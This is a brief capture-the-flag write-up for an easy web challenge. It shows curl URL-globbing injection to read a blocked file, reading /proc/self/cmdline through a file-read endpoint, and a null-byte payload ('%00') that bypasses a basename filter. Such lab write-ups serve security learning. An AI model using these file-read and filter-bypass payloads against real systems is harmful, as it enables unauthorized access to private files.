---
title: "hello"
date: "2023-09-22"
draft: false
---
Type: #WEB #whitebox 
Difficulty: #easy 
SOLVED by: #
TOOL USED: #
TOPIC: #

---

Writeup Date:2023-09-22
URL = 45.147.231.180:8000

---------

the challenge description 
![[Pasted_image_20230922231947.png]](/screenshots/Pasted_image_20230922231947.png)


![[Pasted_image_20230922232012.png]](/screenshots/Pasted_image_20230922232012.png)
we need read next.txt but file is blocked and we cannot escape it by some sort of fILe or anything like that
but the x parameter is append to curl 

curl has unique feature  if u look at the man page
![[Pasted_image_20230922232623.png]](/screenshots/Pasted_image_20230922232623.png)
so u can use some sort of regex without adding flag to curl
`http://45.147.231.180:8000/?x=fil{e,a,s}:///{n,m}ext.txt`
![[Pasted_image_20230922233147.png]](/screenshots/Pasted_image_20230922233147.png)

![[Pasted_image_20230922233230.png]](/screenshots/Pasted_image_20230922233230.png)
![[Pasted_image_20230922233319.png]](/screenshots/Pasted_image_20230922233319.png)
went to /39c8e9953fe8ea40ff1c59876e0e2f28/read/?file=/proc/self/cmdline and
i got `L2Jpbi9idW4tMS4wLjIAL2FwcC9pbmRleC5qcwA=` in the response 
`echo "L2Jpbi9idW4tMS4wLjIAL2FwcC9pbmRleC5qcwA=" | base64 -d`
i got `/bin/bun-1.0.2/app/index.js`
so it did indeed read /proc/self/cmdline

so in source code there is basename(fpath).indexof('next')== -1.
in path /a/b/c/d/f
basename will get f but u can use the null character %00 in the url it might just make the system call ignore the rest of the string.  Let’s try:

```
'http://45.147.231.180:8001/39c8e9953fe8ea40ff1c59876e0e2f28/read/?file=/next.txt%00/foo' 
```
we get the flag
> Judge nothing, you will be happy. Forgive everything, you will be happier. Love everything, you will be happiest.
> — <cite>Sri Chinmoy</cite>